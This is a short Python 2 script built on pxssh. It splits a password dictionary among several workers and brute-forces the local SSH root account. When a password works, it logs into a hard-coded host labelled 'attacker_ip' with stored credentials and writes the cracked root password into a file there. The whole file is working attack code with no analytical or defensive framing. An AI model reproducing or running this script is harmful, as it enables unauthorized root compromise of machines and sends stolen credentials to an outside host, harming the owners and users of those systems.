import pxssh
import optparse
import os
import time
from threading import *
import itertools
import smtplib


dictionary_location = '/dictionary.txt'
dict_num_lines = 15								# or whatever number of lines
total_number_of_users = 3							# same
user_brute_range = dict_num_lines/total_number_of_users			# = 100
attacker_ip = '1.1.1.1'
attacker_user = 'atlas'
attacker_pass = 'fontaine'

def original_connect(host, user, password):
	
	for i in range(1,10):
		try:
			s = pxssh.pxssh()
			s.login(host, user, password)
			print 'Connection Successful\n'
			return s
		except:
			pass

def send_command(session, cmd):

	session.sendline(cmd)
	session.prompt()
	return session.before

def local_connect(host, user, password):

	for i in range(1,10):
		try:
			s = pxssh.pxssh()
			s.login(host, user, password)
			return True

		except Exception, e:
			if 'password refused' in str(e):
				return False
			else:
				pass


def parse_passwords(dictionary, user_number):
	
	passwords = []
	with open(dictionary, "r") as pass_file:
		for line in itertools.islice(pass_file, user_brute_range*user_number, user_brute_range*(user_number + 1)):
			passwords.append(line.strip('\r\n'))
	return passwords

def main():

	parser = optparse.OptionParser('usage prog -n <user number> ')
	parser.add_option('-n', dest='usr_num', type='int', help='specify user_number')
	(options, args) = parser.parse_args()
	user_number = options.usr_num

	if user_number == None:
		user_number = 0

	passwords = parse_passwords(dictionary_location, user_number)

	for psw in passwords:
		if local_connect('127.0.0.1', 'root', psw):
			session = original_connect(attacker_ip, attacker_user, attacker_pass)
			send_command(session, 'echo \" the root password is : ' + psw + ' \" > root_password.txt')
			session.logout()
			break



if __name__ == '__main__':
	main()


